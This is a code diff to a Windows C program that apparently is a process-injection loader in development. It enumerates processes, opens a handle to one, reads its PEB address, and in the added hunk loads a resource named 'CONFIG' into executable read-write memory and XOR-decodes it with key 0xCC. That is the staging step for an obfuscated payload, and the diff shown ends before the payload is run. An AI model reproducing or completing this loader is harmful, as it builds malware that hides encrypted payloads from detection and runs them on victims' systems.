@@ -27,6 +27,7 @@
 
 #include<stdio.h>
 #include<tlhelp32.h>
+#include <stdint.h>
 
 /*
 // might need later
@@ -66,8 +67,8 @@ void test_phnt(void) {
             &returnLength
       );
 
-      if(!NT_SUCCESS(status)) printf("IT DIDN'T WORK CALL THE AMBULANCE: 0x%08X\n", status);
-      else printf("CALL THE AMBULANCE BUT NOT FOR ME: %p\n", pbi.PebBaseAddress);
+      if(!NT_SUCCESS(status)) printf("[*] IT DIDN'T WORK CALL THE AMBULANCE: 0x%08X\n", status);
+      else printf("[*] CALL THE AMBULANCE BUT NOT FOR ME: %p\n", pbi.PebBaseAddress);
 }
 
 int main() {
@@ -104,8 +105,21 @@ int main() {
         FALSE,                                     
         currentProcess.th32ProcessID                                  
     );
-
+      
       // HANDLE hInjectedProcess = NtCreateProcessEx();
       test_phnt();
+
+      // Loading the resource
+      HRSRC hResource = FindResourceW(NULL, L"MAIN", L"CONFIG");
+      HGLOBAL resourceData = LoadResource(NULL, hResource);
+      DWORD resourceSize = SizeofResource(NULL, hResource);
+      void* exec = VirtualAlloc(NULL, resourceSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+      memcpy(exec, resourceData, resourceSize);
+      uint8_t k = 0xCC;
+      uint8_t* p = (uint8_t*)exec;
+      for(size_t i = 0; i < resourceSize; ++i) {
+           p[i] ^= k;
+      }
+
       return 0;
 }
